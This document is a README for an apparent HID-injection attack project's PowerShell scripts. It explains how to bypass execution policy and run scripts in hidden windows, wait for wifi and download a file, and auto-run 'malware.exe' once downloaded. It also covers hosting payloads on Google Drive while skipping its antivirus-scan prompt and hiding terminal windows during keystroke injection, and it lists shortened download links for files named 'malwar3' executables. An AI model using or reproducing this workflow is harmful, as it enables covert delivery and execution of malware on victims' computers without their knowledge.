# powershell_script

This folder contains all powershell scripts used in this project.

## Requirements

- WINDOWS ONLY.

- Activate powershell execution (in admin powershell) before:

  - Execute this command in windows terminal `set-executionpolicy remotesigned` to ALWAYS activate powershell execution.

  - OR use `powershell -ExecutionPolicy ByPass -File .\download_script_when_internet.ps1` command to directly and only execute `download_script_when_internet.ps1` powershell script by exemple. I also noticed that `-ExecutionPolicy ByPass` can be replaced by `-Ex ByPass`.

## How to run a powershell script from terminal (terminal must be at name_of_script.ps1 path)

`powershell .\name_of_script.ps1`

Ex: `powershell .\download_script_when_internet.ps1`

## How to run a (hidden) powershell script

`powershell -windowstyle hidden -file .\name_of_script.ps1` . I also noticed that `-windowstyle hidden -file` can be replaced by `-w h -f`.

## Structure

- `activate_bluetooth.ps1`: This powershell script activates the bluetooth on the computer.
- `download_script_when_internet.ps1`: This powershell script waits for a wifi connection on the computer and download a file at a given hard-coded url (to be change directly in the script) and to a hard-coded path (to be change directly in the script).
- `file_size.ps1`: This powershell script check for the size of a .exe file and executes it when it has achieved a given size. More precisely I used this powershell script to execute a `malware.exe` when PC has finished to download it.

## HowTo Tips

### How to generate link to download your script ?

(You can use https://wetransfer.com (to create link to downloadable file) and https://bitly.com/ (to shorten the url) services to obtain a short url to download your script.)

I used google drive + https://bitly.com/ in the following way (thanks [StackOverflow forum](https://stackoverflow.com/questions/37453841/download-a-file-from-google-drive-using-wget)):

- Put your file in your drive and make it shareable and downloadable to anyone with a link.

- Go to the link and click on the "download" button

- If file is too big, google drive will prompt a "Google Drive can not run a antivirus scan on this page" page.

- Copy url of the download file and DO NOT FORGET TO ADD MANUALLY THE `&confirm=yes` at the end of the url

You should obtain something like this:

`https://drive.google.com/u/0/uc?id=upSd3HvCk1pnr0vYh4r_ZAV15rLyFbtSm&export=download&confirm=yes`

### HID injection tips:

How to reduce a terminal window ? Terminal command: `mode con: lines=1 cols=20`

How to open a reduced terminal window from execute ? Execute command: `cmd /k "mode con: lines=1 cols=16"`

How to move a winow ? Keystrokes injection: `Alt+Space` + `down arrow` + `left arrows` \* 20

How to get user folder path ? Terminal command: `cd  %USERPROFILE%\Desktop`

### Links

- `malwar3_atks_process_wifi.exe`: `https://drive.google.com/u/0/uc?id=1-bwOx_nvLxQXGCf0YEjpWKn7uPUDgd34&export=download&confirm=yes` - `https://bit.ly/3Asrwhp`

- `malwar3_internet.exe`: `https://drive.google.com/u/0/uc?id=1gx8DEaZD74xsDo6SB7rz3O-tL3rUXuv6&export=download&confirm=yes` - `https://bit.ly/3UYEQDA`

- `malwar3_no_internet.exe`: `https://drive.google.com/u/0/uc?id=1sIHeZlWQo9bp_mnmHogMPsqrsR_hzjsd&export=download&confirm=yes` - `https://bit.ly/3LiS6je`
